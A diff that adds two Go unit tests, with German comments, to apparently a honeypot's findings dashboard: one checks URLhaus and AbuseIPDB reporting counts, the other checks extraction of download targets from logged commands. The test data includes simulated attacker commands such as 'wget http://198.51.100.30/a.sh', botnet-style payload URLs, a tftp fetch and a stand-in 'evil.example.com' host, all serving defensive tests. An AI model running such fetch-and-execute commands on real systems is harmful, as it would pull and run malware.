@@ -158,3 +158,63 @@ func TestFundeCacheRangeAndIncrement(t *testing.T) {
 		t.Fatalf("nach neuem Befehl: %d Adressen", n)
 	}
 }
+
+// Live-Check 0.9.6: Kennzahlen oben und Anbietertabelle zählen dasselbe; Gemeldetes wartet nicht zugleich.
+func TestFundeProvidersMatchFunnel(t *testing.T) {
+	allowDoc(t)
+	setOwnNets(OwnNets{Private: true})
+	h := shareHive(t)
+	for _, u := range []string{"http://198.51.100.30/a.sh", "http://198.51.100.30/b.sh", "http://198.51.100.30/c.sh"} {
+		addEvent(h, "command", "ssh", "203.0.113.60", "", "", map[string]any{"input": "wget " + u})
+		h.st.lookupPut(urlSubject(u), "sample_fetch", `{"status":"ok","sha256":"","malware":true}`)
+	}
+	// a: gemeldet (vor dem Zeitraum, kein Protokolleintrag), steht aber noch in der Warteliste; b: wartet
+	h.st.lookupPut(urlSubject("http://198.51.100.30/a.sh"), "urlhaus_report", "ok")
+	until := time.Now().Add(10 * time.Minute)
+	h.share.setWaits("urlhaus", []reportWait{{Subject: "http://198.51.100.30/a.sh", Until: until, Detail: "x"}, {Subject: "http://198.51.100.30/b.sh", Until: until, Detail: "x"}})
+	h.share.setWaits("abuseipdb", []reportWait{{Subject: "203.0.113.60", Until: until}, {Subject: "203.0.113.61", Until: until}})
+	h.st.lookupPut("ip:203.0.113.60", "abuse_report", "ok")
+	rec := httptest.NewRecorder()
+	h.funde(rec, httptest.NewRequest("GET", "/api/funde?range=7d", nil))
+	var d struct {
+		Funnel map[string]int `json:"funnel"`
+		Prov   []fundProvider `json:"providers"`
+	}
+	json.Unmarshal(rec.Body.Bytes(), &d)
+	if d.Funnel["urlhaus_ok"] != 1 || d.Funnel["urlhaus_wait"] != 1 || d.Funnel["fetched"] != 3 {
+		t.Fatalf("Trichter: %v", d.Funnel)
+	}
+	for _, p := range d.Prov {
+		switch p.Kind {
+		case "urlhaus":
+			if p.Counts["ok"] != 1 || p.Waiting != 1 {
+				t.Errorf("URLhaus: %+v", p)
+			}
+		case "sample":
+			if p.Counts["ok"] != 3 {
+				t.Errorf("Dateien sammeln: %+v", p)
+			}
+		case "abuseipdb":
+			if p.Waiting != 1 {
+				t.Errorf("AbuseIPDB wartet: %d", p.Waiting)
+			}
+		}
+	}
+}
+
+// Eingebettete Ziele: Shell-Variablen und Platzhalter sind keine Hosts (Live-Check 0.9.6).
+func TestEmbeddedURLs(t *testing.T) {
+	real, tmpl := embeddedURLs([]string{
+		"http://}", "http://*", "http://$S_HOST}", "http://${HOST}/bins/x86", "http://198.51.100.20/bins/$a",
+		"http://198.51.100.20/t.sh", "https://evil.example.com:8080/x", "http://user@203.0.113.5/a", "tftp://198.51.100.9/mips",
+		"http://localhost/x", "http://a/b", "http://[2001:db8::1]/x", "http://`hostname`/x",
+	})
+	wantReal := []string{"http://198.51.100.20/t.sh", "https://evil.example.com:8080/x", "http://user@203.0.113.5/a", "tftp://198.51.100.9/mips", "http://[2001:db8::1]/x"}
+	wantTmpl := []string{"http://$S_HOST}", "http://${HOST}/bins/x86", "http://198.51.100.20/bins/$a"}
+	if strings.Join(real, " ") != strings.Join(wantReal, " ") {
+		t.Errorf("echte Ziele: %q", real)
+	}
+	if strings.Join(tmpl, " ") != strings.Join(wantTmpl, " ") {
+		t.Errorf("Vorlagen: %q", tmpl)
+	}
+}
